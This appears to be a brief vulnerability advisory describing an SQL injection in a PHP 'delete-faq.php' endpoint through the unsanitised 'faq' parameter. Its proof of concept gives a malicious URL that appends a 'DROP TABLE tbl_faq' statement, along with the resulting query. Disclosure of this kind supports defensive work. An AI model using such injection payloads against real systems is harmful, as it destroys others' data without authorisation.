# Version: 1.0

# CVE : N/A


## Vulnerability Description:

The provided code is vulnerable to SQL injection. The vulnerability arises from directly using user input ($_GET['faq']) in the SQL query without proper validation or sanitization. An attacker can manipulate the 'faq' parameter to inject malicious SQL code, leading to unintended and potentially harmful database operations.


## Proof of Concept (PoC):

An attacker can manipulate the 'faq' parameter to perform SQL injection. For example:

1. Original Request:
http://example.com/endpoint/delete-faq.php?faq=123

2.Malicious Request (SQL Injection):
http://example.com/endpoint/delete-faq.php?faq=123'; DROP TABLE tbl_faq; --

This would result in a query like:

DELETE FROM tbl_faq WHERE tbl_faq_id = '123'; DROP TABLE tbl_faq; --

Which can lead to the deletion of data or even the entire table.
